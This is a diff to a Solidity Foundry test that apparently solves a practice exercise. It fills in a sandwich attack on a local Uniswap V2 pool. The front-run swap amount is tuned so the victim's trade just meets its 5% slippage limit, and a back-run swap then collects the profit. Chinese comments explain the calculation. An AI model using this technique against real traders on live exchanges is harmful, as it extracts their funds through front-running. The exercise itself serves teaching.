@@ -13,6 +13,9 @@ contract SandwichPracticeTest is SandwichSetUp {
     uint256 makerInitialUsdcBalance;
     uint256 attackerInitialEthBalance;
     uint256 victimInitialEthBalance;
+    uint256 useEther;
+    uint256 maxProfit;
+    uint256 optimalSwapEth;
 
     function setUp() public override {
         super.setUp();
@@ -32,6 +35,7 @@ contract SandwichPracticeTest is SandwichSetUp {
         // mint 1 ETH to victim
         vm.deal(victim, victimInitialEthBalance);
 
+        // 1eth : 100 usdc
         // maker provide 100 ETH, 10000 USDC to wethUsdcPool
         vm.startPrank(maker);
         usdc.approve(address(uniswapV2Router), makerInitialUsdcBalance);
@@ -63,9 +67,9 @@ contract SandwichPracticeTest is SandwichSetUp {
 
         // # Discussion 1: how to get victim tx detail info ?
         // without attacker action, original usdc amount out is 98715803, use 5% slippage
-        // originalUsdcAmountOutMin = 93780012;
-        uint256 originalUsdcAmountOut = 98715803;
-        uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;
+        // originalUsdcAmountOutMin = 93780012;                                 //  93.
+        uint256 originalUsdcAmountOut = 98715803;                               //  至少換 98.715803 U
+        uint256 originalUsdcAmountOutMin = (originalUsdcAmountOut * 95) / 100;  //  5% slippage
 
         uniswapV2Router.swapExactETHForTokens{ value: 1 ether }(
             originalUsdcAmountOutMin,
@@ -83,17 +87,44 @@ contract SandwichPracticeTest is SandwichSetUp {
     function _attackerAction1() internal {
         // victim swap ETH to USDC (front-run victim)
         // implement here
+        // attacker 要想辦法讓 victim 換到越少 U 越好，但又要再他可以接受的範圍內
+        // victim  至少要用 1eth 換到 93.78001285 U (98715803 * 95 / 100)
+        // 也就是說 attacker 要讓 pool 的資產比例達到 1: 93.78001285 是最好的
+        // pool 原本的流動池為 100 eth: 10,000 usdc ( 1 eth = 100 usdc)
+        // 100 + x : 10000 - y = 1 : 93.78001285
+
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
+        // 2.614 ether (O) ~ 2.615 ether (X)
+        // 1 Ether = 1,000,000,000,000,000,000 Wei
+        // 1 Ether = 1,000,000,000 Gwei
+        // 1 Ether = 1,000,000 Finney
+        uniswapV2Router.swapExactETHForTokens{value: 2614663723502189357}(0, path, attacker, block.timestamp);
+        vm.stopPrank();
     }
 
     // # Practice 2: attacker sandwich attack
     function _attackerAction2() internal {
         // victim swap USDC to ETH
         // implement here
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(usdc);
+        path[1] = address(weth);
+        usdc.approve(address(uniswapV2Router), usdc.balanceOf(attacker));
+        // swapExactTokensForETH 會做 usdc.transferFrom 了，所以不用自己做
+        // 如果是直接 call swap 的話，才要自己把錢打進 pool 裡
+        // usdc.transferFrom(attacker, address(uniswapV2Router), usdc.balanceOf(attacker));
+        uniswapV2Router.swapExactTokensForETH(usdc.balanceOf(attacker), 0, path, attacker, block.timestamp);
+        vm.stopPrank();
     }
 
     // # Discussion 2: how to maximize profit ?
     function _checkAttackerProfit() internal {
         uint256 profit = attacker.balance - attackerInitialEthBalance;
+        console.log("profit", profit);    // max profit = 34913610775650421
         assertGt(profit, 0);
     }
 }
